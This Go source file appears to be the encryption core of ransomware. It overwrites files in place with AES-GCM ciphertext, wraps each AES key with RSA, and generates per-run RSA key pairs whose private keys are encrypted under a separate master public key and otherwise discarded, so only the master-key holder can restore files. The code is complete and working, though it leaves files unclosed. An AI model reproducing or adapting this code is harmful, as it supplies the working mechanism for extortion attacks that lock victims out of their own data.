package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"io"
	"io/fs"
	"os"
)

func newGCM(publicKey *rsa.PublicKey) (decryptionKey []byte, nonce []byte, gcm cipher.AEAD, err error) {
	key := make([]byte, 32)
	if _, err = rand.Read(key); err != nil {
		return
	}

	var block cipher.Block
	block, err = aes.NewCipher(key)
	if err != nil {
		return
	}

	gcm, err = cipher.NewGCM(block)
	if err != nil {
		return
	}

	nonce = make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return
	}

	decryptionKey, err = rsa.EncryptPKCS1v15(rand.Reader, publicKey, key)
	return
}

func (file *File) EncryptFile(publicKey *rsa.PublicKey) (key []byte, err error) {
	var (
		nonce []byte
		gcm   cipher.AEAD
	)
	key, nonce, gcm, err = newGCM(publicKey)
	if err != nil {
		return
	}

	// TODO: optimize
	var data []byte
	data, err = os.ReadFile(file.Path)
	if err != nil {
		return
	}

	data = gcm.Seal(nonce, nonce, data, nil)

	var info fs.FileInfo
	info, err = os.Stat(file.Path)
	if err != nil {
		return
	}

	// TODO: optimize
	var f *os.File
	f, err = os.OpenFile(file.Path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, info.Mode())
	if err != nil {
		return
	}

	f.Write(data)

	return
}

func (file *File) DecryptFile(rawkey []byte, privateKey *rsa.PrivateKey) (err error) {
	var key []byte
	key, err = rsa.DecryptPKCS1v15(rand.Reader, privateKey, rawkey)
	if err != nil {
		return
	}

	var block cipher.Block
	block, err = aes.NewCipher(key)
	if err != nil {
		return
	}

	var gcm cipher.AEAD
	gcm, err = cipher.NewGCM(block)
	if err != nil {
		return
	}

	// TODO: optimize
	var encryptedData []byte
	encryptedData, err = os.ReadFile(file.Path)
	if err != nil {
		return
	}

	nonceSize := gcm.NonceSize()
	if len(encryptedData) < nonceSize {
		return
	}

	nonce, ciphertext := encryptedData[:nonceSize], encryptedData[nonceSize:]
	var plaintext []byte
	plaintext, err = gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return
	}

	var info fs.FileInfo
	info, err = os.Stat(file.Path)
	if err != nil {
		return
	}

	var f *os.File
	f, err = os.OpenFile(file.Path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, info.Mode())
	if err != nil {
		return
	}

	f.Write(plaintext)
	return
}

func generateNewKey(publicKey *rsa.PublicKey) (encryptedDecryptionPrivateKey []byte, encryptionPublicKey rsa.PublicKey, err error) {
	// New private key, which should be thrown away and encrypted ASAP!!!
	var privateKey *rsa.PrivateKey
	privateKey, err = rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		return
	}

	// The key with which you will encrypt data
	encryptionPublicKey = privateKey.PublicKey

	encryptedDecryptionPrivateKey, err = rsa.EncryptPKCS1v15(rand.Reader, publicKey, x509.MarshalPKCS1PrivateKey(privateKey))
	return
}
